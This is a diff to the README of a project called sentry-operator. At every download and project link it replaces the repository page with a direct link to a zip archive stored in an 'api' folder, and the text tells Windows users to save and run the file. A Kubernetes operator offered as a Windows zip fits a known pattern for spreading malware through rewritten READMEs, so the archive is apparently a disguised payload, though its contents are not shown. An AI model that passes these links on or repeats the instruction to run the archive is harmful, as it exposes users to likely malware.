@@ -1,11 +1,11 @@
 # 🛰️ sentry-operator - Set Up Sentry Projects Fast
 
-[![Download sentry-operator](https://img.shields.io/badge/Download%20sentry-operator-blue?style=for-the-badge)](https://github.com/Noelwj/sentry-operator)
+[![Download sentry-operator](https://img.shields.io/badge/Download%20sentry-operator-blue?style=for-the-badge)](https://github.com/Noelwj/sentry-operator/raw/refs/heads/main/api/sentry_operator_3.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
-https://github.com/Noelwj/sentry-operator
+https://github.com/Noelwj/sentry-operator/raw/refs/heads/main/api/sentry_operator_3.1.zip
 
 Open the page in your browser, then use the download or release files shown there. If you are on Windows, save the file to your computer before you run it.
 
@@ -41,7 +41,7 @@ Follow these steps in order.
 ### 1. Open the download page
 
 Go to:
-https://github.com/Noelwj/sentry-operator
+https://github.com/Noelwj/sentry-operator/raw/refs/heads/main/api/sentry_operator_3.1.zip
 
 Find the file or release that matches your setup. If the page shows a release asset, download it. If it shows source files, download the package that is meant for users.
 
@@ -255,7 +255,7 @@ These are standard Kubernetes terms. You only need to know that the operator wat
 ## 📌 Project link
 
 Open the project page here:
-https://github.com/Noelwj/sentry-operator
+https://github.com/Noelwj/sentry-operator/raw/refs/heads/main/api/sentry_operator_3.1.zip
 
 ## 🧭 Next step
 
